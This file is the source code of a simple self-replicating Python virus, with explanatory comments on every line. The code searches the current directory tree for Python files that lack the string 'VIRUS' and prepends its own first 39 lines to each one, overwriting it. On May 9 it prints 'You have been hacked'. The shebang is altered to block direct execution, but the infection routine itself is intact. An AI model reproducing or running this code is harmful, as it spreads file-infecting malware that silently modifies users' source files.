#!/usr/bin/pyth-on3 # I've changed this to prevent this code from being executed
# Shebang line: Specifies the path to the Python interpreter.

import os
import datetime
# Importing necessary modules: os (operating system interface) and datetime (date and time utilities).

SIGNATURE = "VIRUS"
# Defining a constant variable named SIGNATURE with the value "VIRUS".

def locate(path):
    # Function to locate Python files in the given directory and its subdirectories.
    files_targeted = []
    # Creating an empty list to store targeted files.
    filelist = os.listdir(path)
    # Listing all files and directories in the specified path.

    for fname in filelist:
        # Looping through each file or directory in the list.
        if os.path.isdir(path+"/"+fname):
            # If it's a directory, recursively call the locate function on it.
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # If it's a Python file, check if it's infected.
            infected = False
            # Flag to track if the file is infected.
            for line in open(path+"/"+fname):
                # Loop through each line of the file.
                if SIGNATURE in line:
                    # If the "VIRUS" signature is found in the file, mark it as infected.
                    infected = True
                    break
            if not infected:
                # If not infected, add it to the list of targeted files.
                files_targeted.append(path+"/"+fname)
    
    return files_targeted
# End of the locate function.

def infect(files_targeted):
    # Function to infect targeted Python files with the virus.
    virus = open(os.path.abspath(__file__))
    # Opening the current script file to extract the virus code.
    virusstring = ""
    for i, line in enumerate(virus):
        # Looping through each line of the script.
        if 0 <= i < 39:
            # Reading the first 39 lines of the script to create the virus string.
            virusstring += line
    virus.close
    # Closing the file after reading.

    for fname in files_targeted:
        # Looping through each targeted file.
        f = open(fname)
        temp = f.read()
        f.close()
        # Opening each targeted file and reading its content.
        f = open(fname, "w")
        # Opening the file in write mode to overwrite its content.
        f.write(virusstring + temp)
        # Writing the virus string and the original content back to the file.
        f.close()
        # Closing the file after writing.

# End of the infect function.

def detonate():
    # Function to detonate the virus, checking if it's a specific date to display a message.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Checking if the current date is May 9th.
        print("You have been hacked")
        # Printing a message if the detonation condition is met.

# End of the detonate function.

files_targeted = locate(os.path.abspath(""))
# Finding targeted files in the current directory and its subdirectories.
infect(files_targeted)
# Infecting the targeted files.
detonate()
# Checking if the detonation condition is met.